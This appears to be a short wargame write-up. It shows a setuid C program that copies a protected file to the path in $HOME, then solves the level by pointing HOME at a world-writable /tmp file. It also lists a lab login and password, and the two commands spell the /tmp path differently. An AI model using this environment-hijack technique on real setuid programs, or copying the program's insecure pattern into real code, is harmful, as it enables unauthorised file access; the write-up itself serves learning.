# username
atalanta
# password
mUcSNQlaXtwSvGcgeTYZ
# mission contents
User athena lets us run her program, but she hasn't left us her source code.
# method of solve
There is a weird binary and its C source code file. This is the contents of the source code file
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <pwd.h>
int main()
{
    setuid(2006); 
    setgid(2006); 
    const char *filename;
    struct stat fs;
    int r;
    filename = getenv("HOME");
    printf ("HOME detected: %s\n",filename);
    char cmd[1000];
    FILE *out_file = fopen(getenv("HOME"), "w");
    FILE *fpipe;
    char *command = "/bin/cat /var/lib/me";
    char c = 0;

    if (0 == (fpipe = (FILE*)popen(command, "r")))
    {
        perror("popen() failed.");
        exit(EXIT_FAILURE);
    }

    while (fread(&c, sizeof c, 1, fpipe))
    {
        fprintf(out_file, "%c",c);
    }
    pclose(fpipe);
    pclose(out_file);
    r = stat(filename,&fs);
    struct passwd *pw = getpwuid(fs.st_uid);
    if (pw->pw_name != "atalanta"){
    r = chmod( filename, fs.st_mode & ~(S_IROTH)+~(S_IRGRP) | S_IWGRP );
    }
    stat(filename,&fs);
    return EXIT_SUCCESS;
}
```
This code indicates that binary will write the contents of the /var/lib/me file to the file indicated in the HOME variable. So all we need to do is create a file that can be written to, set that as the HOME variable, then run the `weird` binary
```
touch /tmp/...atalanta-theshyhat/test
chmod 777 /tmp/...atalanta-theshyhat/test
export HOME=/tmp/...atalanta_theshyhat/test
./weird
```
